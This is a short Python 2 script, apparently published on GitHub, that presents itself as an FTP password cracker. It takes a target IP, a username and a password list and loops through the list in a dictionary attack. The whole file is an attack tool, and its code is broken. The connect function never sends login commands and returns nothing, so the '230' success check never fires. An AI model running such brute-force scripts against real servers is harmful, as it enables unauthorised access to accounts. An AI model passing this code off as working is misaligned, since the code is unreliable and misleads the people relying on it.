#!/usr/bin/env python
"""
Original Author: Jack Clark
Language: Python
Purpose: Connects, and cracks an FTP password with a pPython script
Published: GitHub
Contributers: (Will be listed as others contribute)
Edit Dates: 
4/6/2015 (Original Writing)

"""
# Imports
import socket
import re
import argparse

parser = argparse.ArgumentParser(description="This script submits a password list to an FTP server and tries that password list aagainst a given username.")
parser.add_argument('-i','--ip', help='IP address for the given server.',required=True)
parser.add_argument('-u','--username', help='Username to try passwords against',required=True)
parser.add_argument('-p','--passwordlist', help='Password list to try against',required=True)
args = parser.parse_args()

# This will establish connection to server
def connect(username, password, IP_ADDRESS):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	print "[*] Trying "+ username + ":" + password
	
	s.connect((IP_ADDRESS, 21))

	data = s.recv(1024)

	s.send(data)

# Essential Variables

IP_ADDRESS = args.ip

username = args.username

"""
What you need to do is to add potential passwords
to an array, you can also add a text file of these passwords in order
to run brutefore and dictionary attacks using this script.
"""
inputFile = open(args.passwordlist)
passwords = [x.strip() for x in inputFile]

# Start password cracking loop

for password in passwords:

	attempt = connect(username, password, IP_ADDRESS)

	if attempt == "230":
		print "[*] Password found: "+ password
		break
